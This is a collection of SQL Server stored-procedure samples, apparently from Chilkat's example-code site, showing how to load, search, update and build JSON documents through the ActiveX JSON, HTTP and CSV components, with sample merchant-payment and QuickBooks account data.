    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @json, 'EmitCompact', 0

    --  Assume the file contains the data as shown above..
    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/json/estimote.json'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @json, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    --  To get the value for "settings.battery" for the 1st array object:
    DECLARE @batteryVal int
    EXEC sp_OAMethod @json, 'IntOf', @batteryVal OUT, '*[0].settings.battery'

    PRINT 'battery: ' + @batteryVal

    --  To get the value for "settings.timezon" for the 1st array object:
    DECLARE @timeZone nvarchar(4000)
    EXEC sp_OAMethod @json, 'StringOf', @timeZone OUT, '*[0].settings.timezone'

    PRINT 'timezone: ' + @timeZone

    --  To get the "settings.range" for the 2nd array object:
    DECLARE @rangeVal int
    EXEC sp_OAMethod @json, 'IntOf', @rangeVal OUT, '*[1].settings.range'

    PRINT 'range: ' + @rangeVal

    --  To  get the "settings.longitude" for the 1st array object:
    --  Note: Any primitie value can be retrieved as as string: integers, floating point numbers, booleans, etc.
    DECLARE @longitudeStr nvarchar(4000)
    EXEC sp_OAMethod @json, 'StringOf', @longitudeStr OUT, '*[0].settings.longitude'

    PRINT 'longitude: ' + @longitudeStr

    EXEC @hr = sp_OADestroy @json


END
GO




https://www.example-code.com/sql/json_merchant_payment.asp

(SQL Server) JSON Parsing with Sample Data for a Merchant/Payment Transaction
Demonstrates how to load the following JSON into a JSON object and access the values for this document:

{
"id":"8a829449561d9dcb01571dbee3b275b1",
"paymentType":"DB",
"paymentBrand":"VISA",
"amount":"156.00",
"currency":"EUR",
"merchantTransactionId":"E8A39B31-6FA3-4014-A195-3074DF5BF7A1",
"result":{
	"code":"000.100.110",
	"description":"Request successfully processed in 'Merchant in Integrator Test Mode'"
},
"resultDetails":{
	"ConnectorTxID3":"12311312",
	"ConnectorTxID1":"717473"
},
"card":{
	"bin":"420000",
	"last4Digits":"0000",
	"holder":"Andreas",
	"expiryMonth":"12",
	"expiryYear":"2018"
},
"risk":{
	"score":"100"
},
"buildNumber":"4b471ea5366e5e9c9a21392a39769f8d7b40b4e8@2016-09-08 13:31:54 +0000",
"timestamp":"2016-09-12 09:33:52+0000",
}


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    --  Load the JSON into the object.
    --  Call json.Load to load from a string rather than a file...
    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/json/merchantPayment.json'
    --  We are assuming success..

    --  Get the easy stuff:

    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'id'
    PRINT 'id: ' + @sTmp0

    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'paymentType'
    PRINT 'paymentType: ' + @sTmp0

    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'currency'
    PRINT 'currency: ' + @sTmp0

    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'buildNumber'
    PRINT 'buildNumber: ' + @sTmp0

    --  Get information that's nested within a sub-object:

    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'result.code'
    PRINT 'result: code: ' + @sTmp0

    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'result.description'
    PRINT 'result: description: ' + @sTmp0


    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'card.bin'
    PRINT 'card: bin: ' + @sTmp0

    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'card.last4Digits'
    PRINT 'card: last4Digits: ' + @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO




https://www.example-code.com/sql/json_find_record.asp

(SQL Server) JSON FindRecord Example
Demonstrates the FindRecord method for searching an array of JSON records. The data used in this example is available at JSON sample data for FindRecord.

Note: This example requires Chilkat v9.5.0.63 or later.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    --  Note: This example requires Chilkat v9.5.0.63 or later.
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/json/qb_accounts.json'

    --  A sample of the content of qb_accounts.json is shown at the bottom of this example.
    --  The goal is to search the array of Account records to return the 1st match

    --  Find the account with the name "Advertising"
    DECLARE @arrayPath nvarchar(4000)
    SELECT @arrayPath = 'QueryResponse.Account'
    DECLARE @relativePath nvarchar(4000)
    SELECT @relativePath = 'Name'
    DECLARE @value nvarchar(4000)
    SELECT @value = 'Advertising'
    DECLARE @caseSensitive int
    SELECT @caseSensitive = 1

    DECLARE @accountRec int
    EXEC sp_OAMethod @json, 'FindRecord', @accountRec OUT, @arrayPath, @relativePath, @value, @caseSensitive
    EXEC sp_OAGetProperty @json, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN

        PRINT 'Record not found.'
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    --  The accountRec should contain this:

    --        {
    --          "Name": "Advertising",
    --          "SubAccount": false,
    --          "FullyQualifiedName": "Advertising",
    --          "Active": true,
    --          "Classification": "Expense",
    --          "AccountType": "Expense",
    --          "AccountSubType": "AdvertisingPromotional",
    --          "CurrentBalance": 0,
    --          "CurrentBalanceWithSubAccounts": 0,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "7",
    --          "SyncToken": "0",
    --          "MetaData": {
    --            "CreateTime": "2016-09-09T14:42:07-07:00",
    --            "LastUpdatedTime": "2016-09-09T14:42:07-07:00"
    --          }
    --        }


    EXEC sp_OAMethod @accountRec, 'StringOf', @sTmp0 OUT, 'FullyQualifiedName'
    PRINT 'FullyQualifiedName: ' + @sTmp0

    EXEC sp_OAMethod @accountRec, 'StringOf', @sTmp0 OUT, 'AccountType'
    PRINT 'AccountType: ' + @sTmp0

    EXEC sp_OAMethod @accountRec, 'StringOf', @sTmp0 OUT, 'AccountSubType'
    PRINT 'AccountSubType: ' + @sTmp0

    PRINT '----'
    EXEC @hr = sp_OADestroy @accountRec

    --  ------------------------------------------------------------------
    --  Find the first account where the currency is USD
    SELECT @relativePath = 'CurrencyRef.value'
    SELECT @value = 'USD'
    SELECT @caseSensitive = 1

    EXEC sp_OAMethod @json, 'FindRecord', @accountRec OUT, @arrayPath, @relativePath, @value, @caseSensitive
    EXEC sp_OAGetProperty @json, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN

        PRINT 'Record not found.'
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    EXEC sp_OAMethod @accountRec, 'StringOf', @sTmp0 OUT, 'Name'
    PRINT 'Name: ' + @sTmp0

    EXEC sp_OAMethod @accountRec, 'StringOf', @sTmp0 OUT, 'CurrencyRef.name'
    PRINT 'CurrencyRef.name: ' + @sTmp0

    PRINT '----'
    EXEC @hr = sp_OADestroy @accountRec

    --  ------------------------------------------------------------------
    --  Find the first account with "receivable" in the name (case insensitive)
    SELECT @relativePath = 'Name'
    SELECT @value = '*receivable*'
    SELECT @caseSensitive = 0

    EXEC sp_OAMethod @json, 'FindRecord', @accountRec OUT, @arrayPath, @relativePath, @value, @caseSensitive
    EXEC sp_OAGetProperty @json, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN

        PRINT 'Record not found.'
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    EXEC sp_OAMethod @accountRec, 'StringOf', @sTmp0 OUT, 'Name'
    PRINT 'Name: ' + @sTmp0

    PRINT '----'
    EXEC @hr = sp_OADestroy @accountRec

    --  -----------------------------------------------------------------
    --  qb_accounts.json contains this data
    -- 
    --  {
    --    "QueryResponse": {
    --      "Account": [
    --        {
    --          "Name": "Accounts Payable (A/P)",
    --          "SubAccount": false,
    --          "Description": "Description added during update.",
    --          "FullyQualifiedName": "Accounts Payable (A/P)",
    --          "Active": true,
    --          "Classification": "Liability",
    --          "AccountType": "Accounts Payable",
    --          "AccountSubType": "AccountsPayable",
    --          "CurrentBalance": -1602.67,
    --          "CurrentBalanceWithSubAccounts": -1602.67,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "33",
    --          "SyncToken": "1",
    --          "MetaData": {
    --            "CreateTime": "2016-09-10T10:12:02-07:00",
    --            "LastUpdatedTime": "2016-10-24T16:41:39-07:00"
    --          }
    --        },
    --        {
    --          "Name": "Accounts Receivable (A/R)",
    --          "SubAccount": false,
    --          "FullyQualifiedName": "Accounts Receivable (A/R)",
    --          "Active": true,
    --          "Classification": "Asset",
    --          "AccountType": "Accounts Receivable",
    --          "AccountSubType": "AccountsReceivable",
    --          "CurrentBalance": 5281.52,
    --          "CurrentBalanceWithSubAccounts": 5281.52,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "84",
    --          "SyncToken": "0",
    --          "MetaData": {
    --            "CreateTime": "2016-09-14T14:49:29-07:00",
    --            "LastUpdatedTime": "2016-09-17T13:16:17-07:00"
    --          }
    --        },
    --        {
    --          "Name": "Advertising",
    --          "SubAccount": false,
    --          "FullyQualifiedName": "Advertising",
    --          "Active": true,
    --          "Classification": "Expense",
    --          "AccountType": "Expense",
    --          "AccountSubType": "AdvertisingPromotional",
    --          "CurrentBalance": 0,
    --          "CurrentBalanceWithSubAccounts": 0,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "7",
    --          "SyncToken": "0",
    --          "MetaData": {
    --            "CreateTime": "2016-09-09T14:42:07-07:00",
    --            "LastUpdatedTime": "2016-09-09T14:42:07-07:00"
    --          }
    --        },
    --        {
    --          "Name": "Arizona Dept. of Revenue Payable",
    --          "SubAccount": false,
    --          "FullyQualifiedName": "Arizona Dept. of Revenue Payable",
    --          "Active": true,
    --          "Classification": "Liability",
    --          "AccountType": "Other Current Liability",
    --          "AccountSubType": "GlobalTaxPayable",
    --          "CurrentBalance": 0,
    --          "CurrentBalanceWithSubAccounts": 0,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "89",
    --          "SyncToken": "0",
    --          "MetaData": {
    --            "CreateTime": "2016-09-16T12:17:04-07:00",
    --            "LastUpdatedTime": "2016-09-17T13:05:01-07:00"
    --          }
    --        },
    --        {
    --          "Name": "Automobile",
    --          "SubAccount": false,
    --          "FullyQualifiedName": "Automobile",
    --          "Active": true,
    --          "Classification": "Expense",
    --          "AccountType": "Expense",
    --          "AccountSubType": "Auto",
    --          "CurrentBalance": 0,
    --          "CurrentBalanceWithSubAccounts": 0,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "55",
    --          "SyncToken": "0",
    --          "MetaData": {
    --            "CreateTime": "2016-09-14T10:15:53-07:00",
    --            "LastUpdatedTime": "2016-09-14T10:16:05-07:00"
    --          }
    --        },
    --  ...
    -- 

    EXEC @hr = sp_OADestroy @json


END
GO



https://www.example-code.com/sql/json_update_string.asp



(SQL Server) JSON UpdateString
Demonstrates the JSON object's UpdateString method.

Note: The UpdateString method was introduced in Chilkat v9.5.0.63'



CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    --  This example requires Chilkat v9.5.0.63 or greater.

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @json, 'EmitCompact', 0

    --  The UpdateString method updates or adds a string member.
    --  It also auto-creates the objects and/or arrays that
    --  are missing.  For example:
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'test.abc[0].xyz', 'Chicago Cubs'

    --  The JSON now contains:
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  {
    --    "test": {
    --      "abc": [
    --        {
    --          "xyz": "Chicago Cubs"
    --        }
    --      ]
    --    }

    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'test.abc[0].xyz', 'Chicago Cubs are going to win the World Series!'
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  {
    --    "test": {
    --      "abc": [
    --        {
    --          "xyz": "Chicago Cubs are going to win the World Series!"
    --        }
    --      ]
    --    }

    EXEC @hr = sp_OADestroy @json


END
GO



https://www.example-code.com/sql/json_find_record_string.asp



(SQL Server) JSON FindRecordString Example
Demonstrates the FindRecordString method for searching an array of JSON records. The data used in this example is available at JSON sample data for FindRecordString.

Note: This example requires Chilkat v9.5.0.63 or later.



CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    --  Note: This example requires Chilkat v9.5.0.63 or later.
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/json/qb_accounts.json'

    --  A sample of the content of qb_accounts.json is shown at the bottom of this example.
    --  The idea of FindRecordString is to search for a record matching one field,
    --  and then return the value of another field.

    --  For example, we want to find the "Id" for the record where Name = Advertising

    DECLARE @arrayPath nvarchar(4000)
    SELECT @arrayPath = 'QueryResponse.Account'
    DECLARE @relativePath nvarchar(4000)
    SELECT @relativePath = 'Name'
    DECLARE @value nvarchar(4000)
    SELECT @value = 'Advertising'
    DECLARE @caseSensitive int
    SELECT @caseSensitive = 1
    DECLARE @retRelPath nvarchar(4000)
    SELECT @retRelPath = 'Id'

    DECLARE @id nvarchar(4000)
    EXEC sp_OAMethod @json, 'FindRecordString', @id OUT, @arrayPath, @relativePath, @value, @caseSensitive, @retRelPath
    EXEC sp_OAGetProperty @json, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN

        PRINT 'Record not found.'
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    --  The Id should be 7.

    PRINT 'The Id of the Advertising account is ' + @id

    --  -----------------------------------------------------------------
    --  qb_accounts.json contains this data
    -- 
    --  {
    --    "QueryResponse": {
    --      "Account": [
    --        {
    --          "Name": "Accounts Payable (A/P)",
    --          "SubAccount": false,
    --          "Description": "Description added during update.",
    --          "FullyQualifiedName": "Accounts Payable (A/P)",
    --          "Active": true,
    --          "Classification": "Liability",
    --          "AccountType": "Accounts Payable",
    --          "AccountSubType": "AccountsPayable",
    --          "CurrentBalance": -1602.67,
    --          "CurrentBalanceWithSubAccounts": -1602.67,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "33",
    --          "SyncToken": "1",
    --          "MetaData": {
    --            "CreateTime": "2016-09-10T10:12:02-07:00",
    --            "LastUpdatedTime": "2016-10-24T16:41:39-07:00"
    --          }
    --        },
    --        {
    --          "Name": "Accounts Receivable (A/R)",
    --          "SubAccount": false,
    --          "FullyQualifiedName": "Accounts Receivable (A/R)",
    --          "Active": true,
    --          "Classification": "Asset",
    --          "AccountType": "Accounts Receivable",
    --          "AccountSubType": "AccountsReceivable",
    --          "CurrentBalance": 5281.52,
    --          "CurrentBalanceWithSubAccounts": 5281.52,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "84",
    --          "SyncToken": "0",
    --          "MetaData": {
    --            "CreateTime": "2016-09-14T14:49:29-07:00",
    --            "LastUpdatedTime": "2016-09-17T13:16:17-07:00"
    --          }
    --        },
    --        {
    --          "Name": "Advertising",
    --          "SubAccount": false,
    --          "FullyQualifiedName": "Advertising",
    --          "Active": true,
    --          "Classification": "Expense",
    --          "AccountType": "Expense",
    --          "AccountSubType": "AdvertisingPromotional",
    --          "CurrentBalance": 0,
    --          "CurrentBalanceWithSubAccounts": 0,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "7",
    --          "SyncToken": "0",
    --          "MetaData": {
    --            "CreateTime": "2016-09-09T14:42:07-07:00",
    --            "LastUpdatedTime": "2016-09-09T14:42:07-07:00"
    --          }
    --        },
    --        {
    --          "Name": "Arizona Dept. of Revenue Payable",
    --          "SubAccount": false,
    --          "FullyQualifiedName": "Arizona Dept. of Revenue Payable",
    --          "Active": true,
    --          "Classification": "Liability",
    --          "AccountType": "Other Current Liability",
    --          "AccountSubType": "GlobalTaxPayable",
    --          "CurrentBalance": 0,
    --          "CurrentBalanceWithSubAccounts": 0,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "89",
    --          "SyncToken": "0",
    --          "MetaData": {
    --            "CreateTime": "2016-09-16T12:17:04-07:00",
    --            "LastUpdatedTime": "2016-09-17T13:05:01-07:00"
    --          }
    --        },
    --        {
    --          "Name": "Automobile",
    --          "SubAccount": false,
    --          "FullyQualifiedName": "Automobile",
    --          "Active": true,
    --          "Classification": "Expense",
    --          "AccountType": "Expense",
    --          "AccountSubType": "Auto",
    --          "CurrentBalance": 0,
    --          "CurrentBalanceWithSubAccounts": 0,
    --          "CurrencyRef": {
    --            "value": "USD",
    --            "name": "United States Dollar"
    --          },
    --          "domain": "QBO",
    --          "sparse": false,
    --          "Id": "55",
    --          "SyncToken": "0",
    --          "MetaData": {
    --            "CreateTime": "2016-09-14T10:15:53-07:00",
    --            "LastUpdatedTime": "2016-09-14T10:16:05-07:00"
    --          }
    --        },
    --  ...
    -- 

    EXEC @hr = sp_OADestroy @json


END
GO


https://www.example-code.com/sql/quickbooks_parse_customer_detail_report.asp

(SQL Server) QuickBooks - Parse the JSON of a Customer Balance Detail Report
This example is to show how to parse the JSON of a particular Quickbooks report. The techniques shown here may help in parsing similar reports.

The JSON to be parsed is available at Sample Quickbooks Customer Balance Detail Report JSON


https://www.chilkatsoft.com/exampleData/qb_customer_balance_detail_report_2.json


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @success int

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Get the JSON we'll be parsing..
    DECLARE @jsonStr nvarchar(4000)
    EXEC sp_OAMethod @http, 'QuickGetStr', @jsonStr OUT, 'https://www.chilkatsoft.com/exampleData/qb_customer_balance_detail_report_2.json'
    EXEC sp_OAGetProperty @http, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        RETURN
      END

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT

    EXEC sp_OAMethod @json, 'Load', @success OUT, @jsonStr

    -- As an alternative to manually writing code, use this online tool to generate parsing code from sample JSON: 
    -- Generate Parsing Code from JSON

    -- Let's parse the JSON into a CSV, and then save to a CSV file.
    DECLARE @csv int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Csv', @csv OUT

    EXEC sp_OASetProperty @csv, 'HasColumnNames', 1

    -- Set the column names of the CSV.
    DECLARE @numColumns int
    EXEC sp_OAMethod @json, 'SizeOfArray', @numColumns OUT, 'Columns.Column'
    IF @numColumns < 0
      BEGIN

        PRINT 'Unable to get column names'
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @json
        EXEC @hr = sp_OADestroy @csv
        RETURN
      END
    DECLARE @i int
    SELECT @i = 0
    WHILE @i < @numColumns
      BEGIN
        EXEC sp_OASetProperty @json, 'I', @i
        EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'Columns.Column[i].ColTitle'
        EXEC sp_OAMethod @csv, 'SetColumnName', @success OUT, @i, @sTmp0
        SELECT @i = @i + 1
      END

    -- Let's get the rows.
    -- We'll ignore the Header and Summary, and just get the data.
    DECLARE @row int
    SELECT @row = 0
    DECLARE @numRows int
    EXEC sp_OAMethod @json, 'SizeOfArray', @numRows OUT, 'Rows.Row[0].Rows.Row'
    IF @numRows < 0
      BEGIN

        PRINT 'Unable to get data rows'
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @json
        EXEC @hr = sp_OADestroy @csv
        RETURN
      END

    WHILE @row < @numRows
      BEGIN
        EXEC sp_OASetProperty @json, 'I', @row
        EXEC sp_OAMethod @json, 'SizeOfArray', @numColumns OUT, 'Rows.Row[0].Rows.Row[i].ColData'
        DECLARE @col int
        SELECT @col = 0
        WHILE @col < @numColumns
          BEGIN
            EXEC sp_OASetProperty @json, 'J', @col
            EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'Rows.Row[0].Rows.Row[i].ColData[j].value'
            EXEC sp_OAMethod @csv, 'SetCell', @success OUT, @row, @col, @sTmp0
            SELECT @col = @col + 1
          END
        SELECT @row = @row + 1
      END

    -- Show the CSV 
    EXEC sp_OAMethod @csv, 'SaveToString', @sTmp0 OUT
    PRINT @sTmp0

    -- Save to a CSV file
    EXEC sp_OAMethod @csv, 'SaveFile', @success OUT, 'qa_output/customerDetailReport.csv'

    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @json
    EXEC @hr = sp_OADestroy @csv


END
GO

https://www.example-code.com/sql/jsonarray_load.asp


(SQL Server) Load a JsonArray
Demonstrates how to load a JsonArray.

Note: This example requires Chilkat v9.5.0.64 or greater.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    --  This example requires Chilkat v9.5.0.64 or greater.

    --  Loading into a new JSON array is simple and straightforward.
    DECLARE @a int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonArray', @a OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OAMethod @a, 'Load', @success OUT, '[ 1,2,3,4 ]'

    --  Output:  [1,2,3,4]
    EXEC sp_OAMethod @a, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    PRINT '--------'

    --  The JsonArray's Load and LoadSb methods have a peculiar behavior when
    --  it is already part of a JSON document.  In this case, the JsonArray
    --  becomes detached, and the original document remains unchanged.
    --  This is intentional due to the nature of the internal implementation.
    --  For example:

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT

    EXEC sp_OAMethod @json, 'Load', @success OUT, '{ "abc": [ 1,2,3,4 ] }'

    --  Output:  (json) {"abc":[1,2,3,4]}

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT '(json) ' + @sTmp0

    PRINT '--------'

    DECLARE @abc int
    EXEC sp_OAMethod @json, 'ArrayOf', @abc OUT, 'abc'
    --  When Load is called, abc becomes it's own document, and the original is not modified.
    EXEC sp_OAMethod @abc, 'Load', @success OUT, '[ 5,6,7,8 ]'

    --  Output: (abc) [5,6,7,8]

    EXEC sp_OAMethod @abc, 'Emit', @sTmp0 OUT
    PRINT '(abc) ' + @sTmp0

    PRINT '--------'

    --  Output: (json) {"abc":[1,2,3,4]}

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT '(json) ' + @sTmp0

    PRINT '--------'
    EXEC @hr = sp_OADestroy @abc


    EXEC @hr = sp_OADestroy @a
    EXEC @hr = sp_OADestroy @json


END
GO

https://www.example-code.com/sql/json_large_integer_or_double.asp

(SQL Server) JSON Add Large Integer or Double
Demonstrates how to add a large number (larger than what can be held in an integer), or a double/float value to a JSON document.


CREATE PROCEDURE json_large_integer_or_double
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    --  To add a large integer, use AddNumberAt.

    --  (an index of -1 indicates append).
    DECLARE @index int
    SELECT @index = -1
    EXEC sp_OAMethod @json, 'AddNumberAt', @success OUT, @index, 'bignum', '8239845689346587465826345892644873453634563456'

    --  Do the same for a double..
    EXEC sp_OAMethod @json, 'AddNumberAt', @success OUT, @index, 'double', '-153634.295'

    EXEC sp_OASetProperty @json, 'EmitCompact', 0
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  Output:

    --  	{
    --  	  "bignum": 8239845689346587465826345892644873453634563456,
    --  	  "double": -153634.295
    --  	}

    EXEC @hr = sp_OADestroy @json


END
GO



https://www.example-code.com/sql/json_load_array.asp


(SQL Server) Load a JSON Array
The Chilkat JSON API requires the top-level JSON to be an object. Therefore, to load an array requires that it first be wrapped as an object.

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @success int

    --  Imagine we want to load this JSON array for parsing:
    DECLARE @jsonArrayStr nvarchar(4000)
    SELECT @jsonArrayStr = '[{"id":200},{"id":196}]'

    --  First wrap it in a JSON object by prepending "{ "array":" and appending "}"
    DECLARE @sbJson int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.StringBuilder', @sbJson OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OAMethod @sbJson, 'Append', @success OUT, '{"array":'
    EXEC sp_OAMethod @sbJson, 'Append', @success OUT, @jsonArrayStr
    EXEC sp_OAMethod @sbJson, 'Append', @success OUT, '}'

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT

    EXEC sp_OAMethod @sbJson, 'GetAsString', @sTmp0 OUT
    EXEC sp_OAMethod @json, 'Load', @success OUT, @sTmp0

    --  Now we can get the JSON array
    DECLARE @jArray int
    EXEC sp_OAMethod @json, 'ArrayAt', @jArray OUT, 0

    --  Do what you want with the JSON array...
    --  For example:
    DECLARE @jObjId int
    EXEC sp_OAMethod @jArray, 'ObjectAt', @jObjId OUT, 0
    EXEC sp_OAMethod @jObjId, 'IntOf', @iTmp0 OUT, 'id'
    PRINT @iTmp0
    EXEC @hr = sp_OADestroy @jObjId

    EXEC @hr = sp_OADestroy @jArray


    EXEC @hr = sp_OADestroy @sbJson
    EXEC @hr = sp_OADestroy @json


END
GO


https://www.example-code.com/sql/create_complex_json.asp


/*
		Create more Complex JSON Document
		Sample code to create the following JSON document:
*/

    {  
        "Title": "The Cuckoo's Calling",  
        "Author": "Robert Galbraith",  
        "Genre": "classic crime novel",  
        "Detail": {  
            "Publisher": "Little Brown",  
            "Publication_Year": 2013,  
            "ISBN-13": 9781408704004,  
            "Language": "English",  
            "Pages": 494  
        },  
        "Price": [  
            {  
                "type": "Hardcover",  
                "price": 16.65  
            },  
            {  
                "type": "Kindle Edition",  
                "price": 7.00  
            }  
        ]  
    }  

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int

    --  The only reason for failure in the following lines of code would be an out-of-memory condition..

    --  An index value of -1 is used to append at the end.
    DECLARE @index int
    SELECT @index = -1

    EXEC sp_OAMethod @json, 'AddStringAt', @success OUT, -1, 'Title', 'The Cuckoo''s Calling'
    EXEC sp_OAMethod @json, 'AddStringAt', @success OUT, -1, 'Author', 'Robert Galbraith'
    EXEC sp_OAMethod @json, 'AddStringAt', @success OUT, -1, 'Genre', 'classic crime novel'

    --  Let's create the Detail JSON object:
    EXEC sp_OAMethod @json, 'AddObjectAt', @success OUT, -1, 'Detail'
    DECLARE @detail int
    EXEC sp_OAGetProperty @json, 'Size', @iTmp0 OUT
    EXEC sp_OAMethod @json, 'ObjectAt', @detail OUT, @iTmp0 - 1
    EXEC sp_OAMethod @detail, 'AddStringAt', @success OUT, -1, 'Publisher', 'Little Brown'
    EXEC sp_OAMethod @detail, 'AddIntAt', @success OUT, -1, 'Publication_Year', 2013
